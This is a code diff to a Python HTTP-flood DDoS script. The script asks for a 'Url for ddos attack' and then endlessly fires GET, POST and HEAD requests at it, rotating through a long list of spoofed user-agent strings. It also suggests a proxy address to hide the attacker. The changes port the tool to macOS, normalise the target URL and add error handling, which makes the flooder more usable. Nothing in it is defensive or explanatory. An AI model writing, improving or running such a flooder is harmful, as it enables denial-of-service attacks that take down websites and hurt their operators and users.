@@ -1,17 +1,17 @@
 import threading
 import socket
-import user_agent
 import random
 import os
 import sys
 import requests
 import platform
+
 system = platform.uname()[0]
 
 def cls():
     if system == 'Windows':
-      os.system("cls")
-    elif system == 'Linux':
+        os.system("cls")
+    elif system == 'Linux' or system == 'Darwin':  # Darwin is Mac OS
         os.system("clear")
 
 cls()
@@ -22,12 +22,12 @@ C = '\033[36m'
 W = '\033[0m'
 
 def ddos():
-	os.system('python src/logo.py')
-	print('')
-	print(G + "Terminate attack by clicking: CTRL + Z")
-	print(G + "I recommend using a proxy example: 109.200.155.196:8080")
-	users = [
-		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+    os.system('python3 src/logo.py')  # Make sure you're using python3 for Mac OS
+    print('')
+    print(G + "Terminate attack by clicking: CTRL + C")  # Mac/Linux uses CTRL + C to terminate
+    print(G + "I recommend using a proxy example: 109.200.155.196:8080")
+    
+    users = ["Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36",
 	    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36",
 	    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
@@ -1176,25 +1176,29 @@ def ddos():
 		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
 		"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
 		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4"
-	]
-	headers = {
-		'User-Agent' : random.choice(users)
-	}
+        
+    ]
+    
+    headers = {
+        'User-Agent': random.choice(users)
+    }
 
-	url = input(G + "Url for ddos attack: ")
-	while True:
-		requests.get(url, headers=headers)
-		print(R + "Get " + url)
-		requests.post(url, headers=headers)
-		print(R + "post " + url)
-		requests.head(url, headers=headers)
-		print(R + "head " + url)
-		requests.get(url, headers=headers)
-		print(R +"Get " + url)
-		requests.post(url, headers=headers)
-		print(R + "post " + url)
-		requests.head(url, headers=headers)
-		print(R + "head " + url)
-		headers = { 'User-Agent' : random.choice(users) }
+    url = input(G + "Url for ddos attack: ")
+    if not url.startswith("http"):
+        url = "http://" + url  # Ensure the URL has a protocol
+
+    try:
+        while True:
+            requests.get(url, headers=headers)
+            print(R + "Get " + url)
+            requests.post(url, headers=headers)
+            print(R + "Post " + url)
+            requests.head(url, headers=headers)
+            print(R + "Head " + url)
+            headers = {'User-Agent': random.choice(users)}  # Rotate user agents
+    except KeyboardInterrupt:
+        print(R + "\nAttack terminated by user.")
+    except Exception as e:
+        print(R + f"\nError: {e}")
 
 ddos()
